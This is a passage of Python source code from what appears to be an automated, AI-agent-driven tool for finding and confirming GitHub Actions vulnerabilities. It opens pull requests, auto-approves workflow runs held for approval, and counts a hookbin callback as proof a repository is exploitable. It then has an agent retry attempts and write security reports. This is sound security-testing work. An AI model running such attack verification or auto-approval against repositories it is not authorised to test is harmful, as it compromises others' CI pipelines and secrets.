        except json.JSONDecodeError:
            return raw_content

    def _early_hookbin_vulnerability_result(
        self,
        *,
        run_payload: dict[str, Any],
        attempt: int,
        workspace_path: Path,
    ) -> dict[str, Any] | None:
        run_id = run_payload.get("id")
        if not isinstance(run_id, int):
            return None

        hookbin_bin_id = str(run_id)
        get_logs = getattr(self._hookbin_client, "get_logs", None)
        hookbin_logs = self._hookbin_client.get_logs_as_text(hookbin_bin_id)
        has_hookbin_calls = (
            bool(get_logs(hookbin_bin_id))
            if callable(get_logs)
            else bool(hookbin_logs)
        )
        if not has_hookbin_calls:
            return None

        conclusion = run_payload.get("conclusion")
        LOGGER.info(
            "Found hookbin request during workflow polling for run %s. Repository is VULNERABLE",
            run_id,
        )
        attempt_entry = self._build_attempt_result_entry(
            workspace_path=workspace_path,
            payload={
                "attempt": attempt,
                "run_id": run_id,
                "conclusion": conclusion,
                "status": "hookbin_observed_while_polling",
                "hookbin_bin_id": hookbin_bin_id,
                "hookbin_url": f"{self._hookbin_client.base_url}/{hookbin_bin_id}",
                "hookbin_logs": hookbin_logs,
                "evidence_source": "hookbin",
            },
        )
        return {
            "vulnerable": True,
            "attempt": attempt,
            "run_id": run_id,
            "workflow_run_ids": [run_id],
            "hookbin_bin_id": hookbin_bin_id,
            "hookbin_url": f"{self._hookbin_client.base_url}/{hookbin_bin_id}",
            "conclusion": conclusion,
            "hookbin_logs": hookbin_logs,
            "evidence_source": "hookbin",
            "attempt_count": 1,
            "attempts": [attempt_entry],
        }

    def _wait_for_workflow_runs(
        self,
        client: GitHubClient,
        repo_name: str,
        head_sha: str,
        pr_number: int,
        deadline: float,
        poll_interval: float,
        focused_workflow: str | None = None,
        lock_head_sha: bool = False,
        ignored_head_shas: list[str] | None = None,
        on_run_observed: Callable[[dict[str, Any]], dict[str, Any] | None] | None = None,
    ) -> dict[str, Any]:
        target_head_sha = head_sha
        tracked_head_shas: set[str] = {head_sha}
        pending_head_sha: str | None = None
        pending_head_sha_deadline: float | None = None
        runs_by_id: dict[int, dict[str, Any]] = {}
        completed_stable_polls = 0
        approval_attempted_run_ids: set[int] = set()
        ignored_head_sha_set = {
            item.strip()
            for item in (ignored_head_shas or [])
            if isinstance(item, str) and item.strip()
        }
        head_sha_changes: list[dict[str, str]] = []
        focused_workflow_missing_first_seen_at: float | None = None
        poll_count = 0
        LOGGER.info(
            "Polling workflow runs for repo=%s PR #%s (initial_head_sha=%s focused_workflow=%s lock_head_sha=%s ignored_head_shas=%s deadline_at=%.3f poll_interval=%ss).",
            repo_name,
            pr_number,
            head_sha,
            focused_workflow or "(none)",
            lock_head_sha,
            sorted(ignored_head_sha_set),
            deadline,
            poll_interval,
        )

        while time.time() < deadline:
            poll_count += 1
            if not lock_head_sha:
                latest_pr_head_sha = self._resolve_pr_head_sha(
                    client=client,
                    repo_name=repo_name,
                    pr_number=pr_number,
                )
                if latest_pr_head_sha and latest_pr_head_sha != target_head_sha:
                    if latest_pr_head_sha in ignored_head_sha_set:
                        LOGGER.info(
                            "Ignoring PR #%s head SHA `%s` while monitoring because it is configured as non-actionable.",
                            pr_number,
                            latest_pr_head_sha,
                        )
                        time.sleep(poll_interval)
                        continue
                    if pending_head_sha != latest_pr_head_sha:
                        pending_head_sha = latest_pr_head_sha
                        pending_head_sha_deadline = (
                            time.time() + PR_HEAD_SHA_SWITCH_WAIT_SECONDS
                        )
                        LOGGER.info(
                            "PR #%s head SHA changed while monitoring (%s -> %s); waiting up to %ss for a new run before switching.",
                            pr_number,
                            target_head_sha,
                            latest_pr_head_sha,
                            PR_HEAD_SHA_SWITCH_WAIT_SECONDS,
                        )
                elif latest_pr_head_sha == target_head_sha:
                    pending_head_sha = None
                    pending_head_sha_deadline = None

            try:
                runs = client.get_workflow_runs(repo_name, per_page=100)
            except Exception as e:
                LOGGER.debug(f"Error fetching workflow runs: {e}")
                time.sleep(poll_interval)
                continue

            all_runs = runs.get("workflow_runs") or []
            pr_runs_for_tracked_heads = [
                run
                for run in all_runs
                if any(
                    self._workflow_run_matches_pr(
                        run=run,
                        head_sha=candidate_head_sha,
                        pr_number=pr_number,
                        focused_workflow=None,
                    )
                    for candidate_head_sha in tracked_head_shas
                )
            ]
            workflow_runs = [
                run
                for run in all_runs
                if any(
                    self._workflow_run_matches_pr(
                        run=run,
                        head_sha=candidate_head_sha,
                        pr_number=pr_number,
                        focused_workflow=focused_workflow,
                    )
                    for candidate_head_sha in tracked_head_shas
                )
            ]
            LOGGER.debug(
                "Workflow poll #%s for repo=%s PR #%s: total_runs=%s pr_runs_for_tracked_heads=%s focused_matches=%s tracked_head_shas=%s target_head_sha=%s.",
                poll_count,
                repo_name,
                pr_number,
                len(all_runs),
                len(pr_runs_for_tracked_heads),
                len(workflow_runs),
                sorted(tracked_head_shas),
                target_head_sha,
            )

            if pending_head_sha:
                pending_workflow_runs = [
                    run
                    for run in all_runs
                    if self._workflow_run_matches_pr(
                        run=run,
                        head_sha=pending_head_sha,
                        pr_number=pr_number,
                        focused_workflow=focused_workflow,
                    )
                ]
                if pending_workflow_runs:
                    LOGGER.info(
                        "PR #%s head SHA changed while monitoring (%s -> %s); switching run matching target.",
                        pr_number,
                        target_head_sha,
                        pending_head_sha,
                    )
                    head_sha_changes.append(
                        {"from": target_head_sha, "to": pending_head_sha}
                    )
                    target_head_sha = pending_head_sha
                    tracked_head_shas.add(target_head_sha)
                    pending_head_sha = None
                    pending_head_sha_deadline = None
                    completed_stable_polls = 0
                    workflow_runs = [
                        run
                        for run in all_runs
                        if any(
                            self._workflow_run_matches_pr(
                                run=run,
                                head_sha=candidate_head_sha,
                                pr_number=pr_number,
                                focused_workflow=focused_workflow,
                            )
                            for candidate_head_sha in tracked_head_shas
                        )
                    ]
                    pr_runs_for_tracked_heads = [
                        run
                        for run in all_runs
                        if any(
                            self._workflow_run_matches_pr(
                                run=run,
                                head_sha=candidate_head_sha,
                                pr_number=pr_number,
                                focused_workflow=None,
                            )
                            for candidate_head_sha in tracked_head_shas
                        )
                    ]
                elif (
                    pending_head_sha_deadline is not None
                    and time.time() >= pending_head_sha_deadline
                ):
                    LOGGER.info(
                        "PR #%s head SHA changed to %s, but no matching workflow run appeared within %ss; continuing to monitor previous SHA %s.",
                        pr_number,
                        pending_head_sha,
                        PR_HEAD_SHA_SWITCH_WAIT_SECONDS,
                        target_head_sha,
                    )
                    pending_head_sha = None
                    pending_head_sha_deadline = None

            if focused_workflow and not workflow_runs:
                if pr_runs_for_tracked_heads:
                    if focused_workflow_missing_first_seen_at is None:
                        focused_workflow_missing_first_seen_at = time.time()
                        LOGGER.info(
                            "Focused workflow `%s` has no matching runs yet for repo=%s PR #%s, but %s non-focused PR runs are visible. Starting grace timer (%ss).",
                            focused_workflow,
                            repo_name,
                            pr_number,
                            len(pr_runs_for_tracked_heads),
                            FOCUSED_WORKFLOW_MISSING_GRACE_SECONDS,
                        )
                    all_pr_runs_completed = all(
                        isinstance(run_payload, dict)
                        and run_payload.get("status") == "completed"
                        for run_payload in pr_runs_for_tracked_heads
                    )
                    if (
                        all_pr_runs_completed
                        and time.time() - focused_workflow_missing_first_seen_at
                        >= FOCUSED_WORKFLOW_MISSING_GRACE_SECONDS
                    ):
                        LOGGER.warning(
                            "Focused workflow `%s` missing after grace period for repo=%s PR #%s (polls=%s). Returning focused_workflow_missing signal.",
                            focused_workflow,
                            repo_name,
                            pr_number,
                            poll_count,
                        )
                        observed_non_focused_runs: list[dict[str, Any]] = []
                        for run in pr_runs_for_tracked_heads:
                            run_id = run.get("id")
                            if isinstance(run_id, int):
                                observed_non_focused_runs.append(
                                    {
                                        "id": run_id,
                                        "path": str(run.get("path") or "").strip() or None,
                                        "status": str(run.get("status") or "").strip() or None,
                                        "conclusion": (
                                            str(run.get("conclusion") or "").strip() or None
                                        ),
                                    }
                                )
                        return {
                            "runs_by_id": runs_by_id,
                            "timed_out": False,
                            "head_sha_changes": head_sha_changes,
                            "focused_workflow_missing": True,
                            "observed_non_focused_runs": observed_non_focused_runs,
                        }
                else:
                    focused_workflow_missing_first_seen_at = None
            else:
                focused_workflow_missing_first_seen_at = None

            for run in workflow_runs:
                run_id = run.get("id")
                if isinstance(run_id, int):
                    runs_by_id[run_id] = run
                    if run_id not in approval_attempted_run_ids:
                        self._approve_workflow_run_if_required(
                            client=client,
                            repo_name=repo_name,
                            run=run,
                            approval_attempted_run_ids=approval_attempted_run_ids,
                        )
                    if callable(on_run_observed):
                        early_result = on_run_observed(run)
                        if isinstance(early_result, dict):
                            return {
                                "runs_by_id": runs_by_id,
                                "timed_out": False,
                                "head_sha_changes": head_sha_changes,
                                "early_result": early_result,
                            }

            if not runs_by_id:
                completed_stable_polls = 0
                time.sleep(poll_interval)
                continue

            all_completed = all(
                isinstance(run_payload, dict)
                and run_payload.get("status") == "completed"
                for run_payload in runs_by_id.values()
            )
            if all_completed:
                completed_stable_polls += 1
                LOGGER.debug(
                    "Workflow poll #%s for repo=%s PR #%s: all tracked runs completed (stable_polls=%s run_ids=%s).",
                    poll_count,
                    repo_name,
                    pr_number,
                    completed_stable_polls,
                    sorted(runs_by_id.keys()),
                )
                if completed_stable_polls >= 2:
                    LOGGER.info(
                        "Workflow polling complete for repo=%s PR #%s after %s polls; returning run_ids=%s.",
                        repo_name,
                        pr_number,
                        poll_count,
                        sorted(runs_by_id.keys()),
                    )
                    return {
                        "runs_by_id": runs_by_id,
                        "timed_out": False,
                        "head_sha_changes": head_sha_changes,
                    }
            else:
                LOGGER.debug(
                    "Workflow poll #%s for repo=%s PR #%s: waiting for run completion (run_ids=%s).",
                    poll_count,
                    repo_name,
                    pr_number,
                    sorted(runs_by_id.keys()),
                )
                completed_stable_polls = 0

            time.sleep(poll_interval)

        try:
            runs = client.get_workflow_runs(repo_name, per_page=100)
            for run in runs.get("workflow_runs") or []:
                if not any(
                    self._workflow_run_matches_pr(
                        run=run,
                        head_sha=candidate_head_sha,
                        pr_number=pr_number,
                        focused_workflow=focused_workflow,
                    )
                    for candidate_head_sha in tracked_head_shas
                ):
                    continue
                run_id = run.get("id")
                if isinstance(run_id, int):
                    runs_by_id[run_id] = run
        except Exception as e:
            LOGGER.debug(f"Error fetching final workflow runs: {e}")

        LOGGER.warning(
            "Workflow polling deadline reached for repo=%s PR #%s after %s polls. Returning timed_out with run_ids=%s head_sha_changes=%s.",
            repo_name,
            pr_number,
            poll_count,
            sorted(runs_by_id.keys()),
            head_sha_changes,
        )
        return {
            "runs_by_id": runs_by_id,
            "timed_out": True,
            "head_sha_changes": head_sha_changes,
        }

    def _approve_workflow_run_if_required(
        self,
        *,
        client: GitHubClient,
        repo_name: str,
        run: dict[str, Any],
        approval_attempted_run_ids: set[int],
    ) -> None:
        run_id = run.get("id")
        if not isinstance(run_id, int):
            return

        run_status = str(run.get("status") or "").strip().lower()
        run_conclusion = str(run.get("conclusion") or "").strip().lower()
        needs_approval = (
            run_status in WORKFLOW_RUN_APPROVAL_REQUIRED_STATUSES
            or run_conclusion in WORKFLOW_RUN_APPROVAL_REQUIRED_CONCLUSIONS
        )
        if not needs_approval:
            return

        approval_attempted_run_ids.add(run_id)
        try:
            client.approve_workflow_run(repo_name, run_id)
            status_parts = []
            if run_status:
                status_parts.append(f"status='{run_status}'")
            if run_conclusion:
                status_parts.append(f"conclusion='{run_conclusion}'")
            status_reason = ", ".join(status_parts) if status_parts else "unknown state"
            LOGGER.info(
                "Approved workflow run %s for %s after approval-required state (%s).",
                run_id,
                repo_name,
                status_reason,
            )
        except Exception as exc:
            LOGGER.warning(
                "Failed approving workflow run %s for %s: %s",
                run_id,
                repo_name,
                exc,
            )

    def _resolve_pr_head_sha(
        self,
        *,
        client: GitHubClient,
        repo_name: str,
        pr_number: int,
    ) -> str | None:
        if not hasattr(client, "get_pull_request"):
            return None
        pr, _ = self._fetch_pull_request_with_visibility_retry(
            client=client,
            repo_name=repo_name,
            pr_number=pr_number,
            max_elapsed_seconds=PR_HEAD_REFRESH_VISIBILITY_MAX_SECONDS,
            event_prefix="pr_fetch_retry",
        )
        if not isinstance(pr, dict):
            LOGGER.debug(
                "Unable to refresh PR head SHA for #%s on %s after bounded visibility retry.",
                pr_number,
                repo_name,
            )
            return None
        head_sha = str((pr.get("head") or {}).get("sha") or "").strip()
        return head_sha or None

    def _fetch_pull_request_with_visibility_retry(
        self,
        *,
        client: GitHubClient,
        repo_name: str,
        pr_number: int,
        max_elapsed_seconds: float,
        event_prefix: str,
        head_ref: str | None = None,
        base_ref: str | None = None,
    ) -> tuple[dict[str, Any] | None, int]:
        started_at = time.monotonic()
        attempt = 0
        last_exc: Exception | None = None
        current_pr_number = pr_number

        while True:
            attempt += 1
            elapsed_ms = int((time.monotonic() - started_at) * 1000)
            try:
                pr = client.get_pull_request(repo_name, current_pr_number)
                self._log_lifecycle_event(
                    event=event_prefix,
                    repo=repo_name,
                    pr_number=current_pr_number,
                    attempt=attempt,
                    elapsed_ms=elapsed_ms,
                    status="success",
                )
                return pr, current_pr_number
            except Exception as exc:
                last_exc = exc
                if not self._is_not_found_error(exc):
                    raise
                self._log_lifecycle_event(
                    event=event_prefix,
                    repo=repo_name,
                    pr_number=current_pr_number,
                    attempt=attempt,
                    elapsed_ms=elapsed_ms,
                    status="not_found",
                    github_request_id=self._extract_github_request_id(exc),
                    endpoint=f"/repos/{repo_name}/pulls/{current_pr_number}",
                )
                elapsed = time.monotonic() - started_at
                if (
                    elapsed >= max_elapsed_seconds
                    or attempt >= PR_FETCH_VISIBILITY_MAX_ATTEMPTS
                ):
                    break
                time.sleep(self._compute_retry_sleep_seconds(attempt))

        remapped = self._remap_pull_request_number(
            client=client,
            repo_name=repo_name,
            head_ref=head_ref,
            base_ref=base_ref,
            initial_pr_number=current_pr_number,
            elapsed_ms=int((time.monotonic() - started_at) * 1000),
        )
        if isinstance(remapped, int):
            try:
                pr = client.get_pull_request(repo_name, remapped)
                return pr, remapped
            except Exception as exc:
                if not self._is_not_found_error(exc):
                    raise
                last_exc = exc

        if last_exc is not None:
            LOGGER.warning(
                "PR #%s on %s remained unavailable after %.1fs: %s",
                pr_number,
                repo_name,
                max_elapsed_seconds,
                last_exc,
            )
        return None, pr_number

    def _remap_pull_request_number(
        self,
        *,
        client: GitHubClient,
        repo_name: str,
        head_ref: str | None,
        base_ref: str | None,
        initial_pr_number: int,
        elapsed_ms: int,
    ) -> int | None:
        normalized_head = str(head_ref or "").strip()
        normalized_base = str(base_ref or "").strip()
        if not normalized_head or not normalized_base:
            return None
        try:
            open_prs = client.list_pull_requests(
                repo_name=repo_name,
                state="open",
                head=normalized_head,
                base=normalized_base,
            )
        except Exception as exc:
            LOGGER.debug(
                "Failed PR remap query for %s head=%s base=%s: %s",
                repo_name,
                normalized_head,
                normalized_base,
                exc,
            )
            return None
        candidate_numbers = sorted(
            {
                int(item.get("number"))
                for item in open_prs
                if isinstance(item, dict) and isinstance(item.get("number"), int)
            }
        )
        if not candidate_numbers:
            self._log_lifecycle_event(
                event="pr_fetch_remap",
                repo=repo_name,
                pr_number=initial_pr_number,
                status="not_found",
                elapsed_ms=elapsed_ms,
                head=normalized_head,
                base=normalized_base,
            )
            return None
        remapped = candidate_numbers[-1]
        self._log_lifecycle_event(
            event="pr_fetch_remap",
            repo=repo_name,
            pr_number=initial_pr_number,
            remapped_pr_number=remapped,
            status="success",
            elapsed_ms=elapsed_ms,
            head=normalized_head,
            base=normalized_base,
        )
        return remapped

    @staticmethod
    def _compute_retry_sleep_seconds(attempt: int) -> float:
        if attempt >= 32:
            capped = PR_FETCH_RETRY_MAX_SECONDS
            jitter = random.uniform(0.0, 0.3 * capped)
            return capped + jitter
        capped = min(
            PR_FETCH_RETRY_MAX_SECONDS,
            PR_FETCH_RETRY_BASE_SECONDS * (2 ** max(0, attempt - 1)),
        )
        jitter = random.uniform(0.0, 0.3 * capped)
        return capped + jitter

    @staticmethod
    def _is_not_found_error(exc: Exception) -> bool:
        return " 404 " in str(exc) or "404 Not Found" in str(exc)

    @staticmethod
    def _extract_repo_owner(repo_name: str) -> str | None:
        if not isinstance(repo_name, str) or "/" not in repo_name:
            return None
        owner = repo_name.split("/", 1)[0].strip()
        return owner or None

    @staticmethod
    def _extract_github_request_id(exc: Exception) -> str | None:
        message = str(exc)
        match = GITHUB_REQUEST_ID_PATTERN.search(message)
        if match is None:
            return None
        request_id = match.group(1).strip()
        return request_id or None

    @staticmethod
    def _build_execution_error_result(
        *,
        reason: str,
        error_class: str,
        failure_fingerprint: str,
        details: dict[str, Any] | None = None,
    ) -> dict[str, Any]:
        payload: dict[str, Any] = {
            "vulnerable": False,
            "status": "execution_error",
            "reason": reason,
            "error_stage": "execution",
            "error_class": error_class,
            "failure_fingerprint": failure_fingerprint,
        }
        if isinstance(details, dict):
            payload.update(details)
        return payload

    @staticmethod
    def _log_lifecycle_event(**payload: Any) -> None:
        LOGGER.info("attack.lifecycle %s", json.dumps(payload, sort_keys=True))

    def _workflow_run_matches_pr(
        self,
        *,
        run: dict[str, Any],
        head_sha: str,
        pr_number: int,
        focused_workflow: str | None = None,
    ) -> bool:
        if run.get("head_sha") != head_sha:
            return False

        expected_workflow_path = self._normalize_workflow_path_for_matching(
            focused_workflow
        )
        if expected_workflow_path:
            run_workflow_path = self._normalize_workflow_path_for_matching(
                str(run.get("path") or "").split("@", 1)[0]
            )
            if run_workflow_path != expected_workflow_path:
                return False

        pull_requests = run.get("pull_requests")
        if not isinstance(pull_requests, list) or not pull_requests:
            return True

        for pr_ref in pull_requests:
            if not isinstance(pr_ref, dict):
                continue
            if pr_ref.get("number") == pr_number:
                return True
        return False

    @staticmethod
    def _normalize_workflow_path_for_matching(path: str | None) -> str | None:
        if not isinstance(path, str):
            return None
        normalized = path.strip().replace("\\", "/")
        if not normalized:
            return None
        if normalized.startswith("./"):
            normalized = normalized[2:]
        if normalized.startswith("github/workflows/"):
            normalized = f".{normalized}"
        elif "/" not in normalized:
            normalized = f".github/workflows/{normalized}"
        return normalized

    @staticmethod
    def _attempt_has_successful_local_test(attempt: Any) -> bool:
        if not isinstance(attempt, dict):
            return False

        local_test_result = str(attempt.get("local_test_result") or "").strip().lower()
        if local_test_result == "success":
            return True

        agent_output = attempt.get("agent_output")
        if isinstance(agent_output, dict):
            nested_result = str(agent_output.get("local_test_result") or "").strip().lower()
            if nested_result == "success":
                return True
        return False

    def _detect_security_report_verification_sources(
        self, result: dict[str, Any]
    ) -> list[str]:
        sources: list[str] = []
        if result.get("vulnerable") is True:
            sources.append("hosted")
        attempts = result.get("attempts")
        if isinstance(attempts, list) and any(
            self._attempt_has_successful_local_test(attempt) for attempt in attempts
        ):
            sources.append("act")
        return sources

    @staticmethod
    def _extract_write_github_token_permissions(
        github_token_permissions: dict[str, Any] | None,
    ) -> list[str]:
        if not isinstance(github_token_permissions, dict):
            return []
        permissions = github_token_permissions.get("permissions")
        if not isinstance(permissions, dict):
            return []
        write_permissions = [
            str(scope).strip()
            for scope, value in permissions.items()
            if isinstance(scope, str)
            and str(scope).strip()
            and str(value).strip().lower() == "write"
        ]
        return sorted(write_permissions, key=lambda item: item.lower())

    @staticmethod
    def _slugify_report_component(value: str, *, fallback: str) -> str:
        normalized = value.strip().lower().replace("\\", "/")
        normalized = normalized.replace("/", "-")
        normalized = re.sub(r"[^a-z0-9._-]+", "-", normalized)
        normalized = re.sub(r"-{2,}", "-", normalized)
        normalized = normalized.strip("-.")
        return normalized or fallback

    def _security_report_filename(
        self,
        *,
        repository_name: str,
        risk_index: int | None,
        focused_workflow: str | None,
    ) -> str:
        repo_slug = self._slugify_report_component(
            repository_name, fallback="unknown-repository"
        )
        risk_number = (risk_index + 1) if isinstance(risk_index, int) and risk_index >= 0 else 1
        workflow_slug = self._slugify_report_component(
            focused_workflow or "",
            fallback="unknown-workflow",
        )
        return f"{repo_slug}-risk-{risk_number}-{workflow_slug}.md"

    def _build_security_report_follow_up_prompt(
        self,
        *,
        repository_name: str,
        focused_workflow: str | None,
        pull_request_url: str,
        verification_sources: list[str],
        github_token_permission_status: str,
        github_token_write_permissions: list[str],
    ) -> str:
        return render_template_file(
            SECURITY_REPORT_FOLLOW_UP_TEMPLATE_PATH,
            repository_name=repository_name,
            focused_workflow=focused_workflow or "(unknown)",
            pull_request_url=pull_request_url,
            verification_sources=", ".join(verification_sources),
            github_token_permission_status=github_token_permission_status,
            github_token_write_permissions=", ".join(github_token_write_permissions)
            if github_token_write_permissions
            else "(none detected)",
        )

    def _generate_security_report_if_verified(
        self,
        *,
        sandbox: RepositorySandbox,
        workspace_path: Path,
        timeout: int,
        git_token: str,
        repository_name: str,
        focused_workflow: str | None,
        pull_request_url: str,
        result: dict[str, Any],
        github_token_permissions: dict[str, Any] | None,
        risk_index: int | None,
    ) -> dict[str, Any] | None:
        if not self._generate_security_report:
            return None

        verification_sources = self._detect_security_report_verification_sources(result)
        if not verification_sources:
            return None

        report_dir = self._security_reports_dir or (Path.cwd() / "security-reports")
        report_dir.mkdir(parents=True, exist_ok=True)

        prompt_path = workspace_path.parent / AGENT_TASK_FILENAME
        if prompt_path.exists():
            original_prompt = prompt_path.read_text(encoding="utf-8")
        else:
            workspace_prompt_path = workspace_path / AGENT_TASK_FILENAME
            if workspace_prompt_path.exists() and workspace_prompt_path.is_file():
                original_prompt = workspace_prompt_path.read_text(encoding="utf-8")
            else:
                original_prompt = ""
            prompt_path.write_text(original_prompt, encoding="utf-8")
        permission_status = "unknown"
        if isinstance(github_token_permissions, dict):
            permission_status = str(
                github_token_permissions.get("status") or "unknown"
            ).strip() or "unknown"
        write_permissions = self._extract_write_github_token_permissions(
            github_token_permissions
        )
        follow_up_prompt = self._build_security_report_follow_up_prompt(
            repository_name=repository_name or "unknown-repository",
            focused_workflow=focused_workflow,
            pull_request_url=pull_request_url,
            verification_sources=verification_sources,
            github_token_permission_status=permission_status,
            github_token_write_permissions=write_permissions,
        )
        prompt_path.write_text(original_prompt.rstrip() + "\n" + follow_up_prompt, encoding="utf-8")

        try:
            self._prepare_agent_prompt_in_workspace(workspace_path)
            agent_result = self._run_agent_with_fallback(
                sandbox=sandbox,
                workspace_path=workspace_path,
                timeout=timeout,
                git_token=git_token,
            )
            if not agent_result.get("ok"):
                return {
                    "status": "failed",
                    "verification_sources": verification_sources,
                    "error": (
                        "Security report follow-up prompt failed: "
                        f"status={agent_result.get('status')} exit_code={agent_result.get('exit_code')}"
                    ),
                }

            workspace_report_path = workspace_path / SECURITY_REPORT_WORKSPACE_FILENAME
            if not workspace_report_path.exists() or not workspace_report_path.is_file():
                return {
                    "status": "failed",
                    "verification_sources": verification_sources,
                    "error": (
                        "Agent follow-up finished but "
                        f"`{SECURITY_REPORT_WORKSPACE_FILENAME}` was not created."
                    ),
                }

            report_content = workspace_report_path.read_text(encoding="utf-8")
            persisted_path = report_dir / self._security_report_filename(
                repository_name=repository_name or "unknown-repository",
                risk_index=risk_index,
                focused_workflow=focused_workflow,
            )
            persisted_path.write_text(report_content, encoding="utf-8")
            return {
                "status": "generated",
                "verification_sources": verification_sources,
                "workspace_path": str(workspace_report_path),
                "persisted_path": str(persisted_path),
            }
        except Exception as exc:
            return {
                "status": "failed",
                "verification_sources": verification_sources,
                "error": str(exc),
            }
        finally:
            try:
                prompt_path.write_text(original_prompt, encoding="utf-8")
            except OSError as exc:
                LOGGER.warning(
                    "Failed restoring original agent prompt after security report follow-up: %s",
                    exc,
                )

    def _download_and_extract_logs(
        self, client: GitHubClient, repo_name: str, run_id: int
    ) -> str:
        logs_text, _ = self._download_and_extract_logs_with_files(
            client=client,
            repo_name=repo_name,
            run_id=run_id,
        )
        return logs_text

    def _download_and_extract_logs_with_files(
        self,
        *,
        client: GitHubClient,
        repo_name: str,
        run_id: int,
        workspace_path: Path | None = None,
        attempt: int | None = None,
    ) -> tuple[str, list[str]]:
        import io

        try:
            logs_content = client.download_workflow_run_logs(repo_name, run_id)
        except Exception as e:
            LOGGER.warning(f"Failed to download logs: {e}")
            return "", []

        if not logs_content:
            return "", []

        try:
            with zipfile.ZipFile(io.BytesIO(logs_content)) as zf:
                names = zf.namelist()
                entries: list[tuple[str, str]] = []
                parts: list[str] = []
                for name in names:
                    if name.endswith("/"):
                        continue
                    try:
                        with zf.open(name) as f:
                            content = f.read().decode("utf-8", errors="ignore")
                            if not content:
                                continue
                            include_by_error_marker = "##[error]" in content
                            include_set_up_job_error = (
                                self._is_set_up_job_log_name(name)
                                and "##[error]" in content
                            )
                            include_checkout_failure = self._contains_checkout_failure_in_text(
                                content
                            )
                            if (
                                not include_by_error_marker
                                and not include_set_up_job_error
                                and not include_checkout_failure
                            ):
                                continue
                            entries.append((name, content))
                            parts.append(f"=== {name} ===\n{content}\n")
                    except Exception:
                        pass
                log_files: list[str] = []
                if workspace_path is not None and attempt is not None and entries:
                    log_files = self._write_workflow_log_files_for_agent(
                        workspace_path=workspace_path,
                        attempt=attempt,
                        run_id=run_id,
                        entries=entries,
                    )
                return "\n\n".join(parts), log_files
        except Exception as e:
            LOGGER.warning(f"Failed to extract logs: {e}")
            return "", []

    @staticmethod
    def _is_set_up_job_log_name(name: str) -> bool:
        normalized = name.strip().replace("\\", "/").lower()
        return "set up job" in normalized

    def _contains_set_up_job_failure(
        self,
        *,
        logs_content: str,
        log_files: list[str],
    ) -> bool:
        if any(self._is_set_up_job_log_name(path) for path in log_files):
            return True

        marker = "=== "
        for block in logs_content.split(marker):
            if not block.strip():
                continue
            header, _, _content = block.partition(" ===")
            if self._is_set_up_job_log_name(header):
                return True
        return False

    @staticmethod
    def _is_checkout_log_name(name: str) -> bool:
        normalized = name.strip().replace("\\", "/").lower()
        return "checkout" in normalized

    @staticmethod
    def _contains_checkout_failure_in_text(content: str) -> bool:
        inside_checkout_step = False
        for line in content.splitlines():
            normalized = line.strip().lower()
            if "##[group]run actions/checkout@" in normalized:
                inside_checkout_step = True
                continue
            if not inside_checkout_step:
                continue
            if "##[error]" in line:
                return True
            if "##[group]run " in normalized and "actions/checkout@" not in normalized:
                inside_checkout_step = False
                continue
            if "post job cleanup" in normalized:
                inside_checkout_step = False
        return False

    def _contains_checkout_failure(
        self,
        *,
        logs_content: str,
        log_files: list[str],
    ) -> bool:
        if any(self._is_checkout_log_name(path) for path in log_files):
            return True

        if self._contains_checkout_failure_in_text(logs_content):
            return True

        marker = "=== "
        for block in logs_content.split(marker):
            if not block.strip():
                continue
            header, _, _content = block.partition(" ===")
            if self._is_checkout_log_name(header):
                return True
        return False

    def _write_workflow_log_files_for_agent(
        self,
        *,
        workspace_path: Path,
        attempt: int,
        run_id: int,
        entries: list[tuple[str, str]],
    ) -> list[str]:
        target_root = (
            workspace_path
            / WORKFLOW_LOGS_DIRNAME
            / f"attempt-{attempt}"
            / f"run-{run_id}"
        )
        target_root.mkdir(parents=True, exist_ok=True)

        written: list[str] = []
        for index, (name, content) in enumerate(entries, start=1):
            normalized = name.replace("\\", "/")
            parts = [
                part
                for part in normalized.split("/")
                if part and part not in {".", ".."}
            ]
            safe_name = "__".join(parts).strip()
            if not safe_name:
                safe_name = f"log-{index}.txt"
            output_path = target_root / safe_name
            output_path.write_text(content, encoding="utf-8")
            written.append(output_path.relative_to(workspace_path).as_posix())
        return written

    def _read_log_file_contents_for_prompt(
        self,
        *,
        workspace_path: Path,
        relative_paths: list[str],
    ) -> str:
        sections: list[str] = []
        for relative_path in relative_paths:
            normalized = relative_path.replace("\\", "/").strip()
            if not normalized:
                continue
            output_path = (workspace_path / normalized).resolve()
            try:
                output_path.relative_to(workspace_path.resolve())
            except Exception:
                LOGGER.warning(
                    "Skipping log file outside workspace while building retry prompt: %s",
                    normalized,
                )
                continue
            if not output_path.exists() or not output_path.is_file():
                continue
            try:
                content = output_path.read_text(encoding="utf-8")
            except Exception as e:
                LOGGER.warning(
                    "Failed to read workflow log file for retry prompt (%s): %s",
                    normalized,
                    e,
                )
                continue
            if len(content) > LOG_PROMPT_MAX_CHARS:
                omitted_chars = len(content) - (
                    LOG_PROMPT_HEAD_CHARS + LOG_PROMPT_TAIL_CHARS
                )
                content = (
                    f"{content[:LOG_PROMPT_HEAD_CHARS]}"
                    "\n\n"
                    f"[... middle of log omitted ({omitted_chars} characters removed) ...]\n"
                    f"Some details between the command start and error output may be missing.\n"
                    f"Read the full log at `{normalized}` if you need the omitted middle.\n\n"
                    f"{content[-LOG_PROMPT_TAIL_CHARS:]}"
                )
            sections.append(f"=== {normalized} ===\n{content}")

        return "\n\n".join(sections)

    @staticmethod
    def _truncate_utf8_bytes(value: str, max_bytes: int) -> str:
        if max_bytes <= 0:
            return ""
        encoded = value.encode("utf-8")
        if len(encoded) <= max_bytes:
            return value
        truncated = encoded[:max_bytes]
        while truncated:
            try:
                return truncated.decode("utf-8")
            except UnicodeDecodeError:
                truncated = truncated[:-1]
        return ""

    @staticmethod
    def _base_retry_prompt(prompt_text: str) -> str:
        marker_index = prompt_text.find(RETRY_PROMPT_SECTION_MARKER)
        if marker_index < 0:
            return prompt_text
        return prompt_text[:marker_index]

    def _retry_with_logs(
        self,
        workspace_path: Path,
        sandbox: RepositorySandbox,
        client: GitHubClient,
        repo_name: str,
        branch_name: str,
        user_b_login: str,
        default_branch: str,
        previous_logs: list[dict],
        attempt: int,
        required_path_filters: list[str] | None = None,
        retry_openhands_runner: Callable[[], dict[str, Any]] | None = None,
        pr_head_sha_changes: list[dict[str, str]] | None = None,
    ) -> bool:
        LOGGER.info(f"Retrying with previous logs appended to prompt")

        prompt_path = workspace_path.parent / AGENT_TASK_FILENAME
        if prompt_path.exists():
            current_prompt = prompt_path.read_text(encoding="utf-8")
            base_prompt = self._base_retry_prompt(current_prompt)
            attempt_logs = [
                log
                for log in previous_logs
                if isinstance(log, dict) and log.get("attempt") == attempt
            ]
